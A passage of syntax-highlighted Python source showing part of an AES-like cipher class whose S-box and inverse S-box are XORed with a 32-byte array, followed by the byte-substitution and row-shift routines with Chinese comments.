class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">S_BOX</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">^=</span> <span class="n">bytes_array</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">I_SBOX</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0xDC</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xFB</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xCF</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0xEC</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xA2</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0xCD</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xE3</span><span class="p">,</span> <span class="mh">0xB2</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xB6</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xA7</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x4F</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xFD</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0xBE</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0xA0</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x7B</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6B</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xC7</span><span class="p">,</span> <span class="mh">0xD0</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xA4</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0xD7</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x82</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xAA</span><span class="p">][:</span><span class="mi">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">I_SBOX</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="p">]</span> <span class="o">^=</span> <span class="n">bytes_array</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">format_SBOX</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">isRE</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">isRE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">I_SBOX</span><span class="p">)</span> <span class="o">==</span> <span class="mi">256</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">I_SBOX</span> <span class="o">=</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">I_SBOX</span><span class="p">[</span><span class="n">j</span><span class="p">:</span><span class="n">j</span> <span class="o">+</span> <span class="mi">16</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">16</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">S_BOX</span><span class="p">)</span> <span class="o">==</span> <span class="mi">256</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">S_BOX</span> <span class="o">=</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">S_BOX</span><span class="p">[</span><span class="n">j</span><span class="p">:</span><span class="n">j</span> <span class="o">+</span> <span class="mi">16</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">16</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">SubBytes</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">State</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 字节替换</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">S_BOX</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="ow">in</span>
</span></span><span class="line"><span class="cl">               <span class="p">[(</span><span class="n">_</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="n">_</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">State</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">SubBytes_Inv</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">State</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 字节逆替换</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">I_SBOX</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="ow">in</span>
</span></span><span class="line"><span class="cl">               <span class="p">[(</span><span class="n">_</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="n">_</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">State</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">ShiftRows</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">S</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 行移位</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="n">S</span><span class="p">[</span> <span class="mi">0</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">5</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="n">S</span><span class="p">[</span> <span class="mi">4</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">9</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">3</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="n">S</span><span class="p">[</span> <span class="mi">8</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">2</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">7</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="n">S</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">1</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">6</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">ShiftRows_Inv</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">S</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 逆行移位</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[</span><span class="n">S</span><span class="p">[</span> <span class="mi">0</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">13</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">7</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="n">S</span><span class="p">[</span> <span class="mi">4</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">1</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">14</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">11</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="n">S</span><span class="p">[</span> <span class="mi">8</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">5</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">2</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="n">S</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">9</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">6</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span> <span class="mi">3</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">MixColumns</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">State</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 列混合</span>
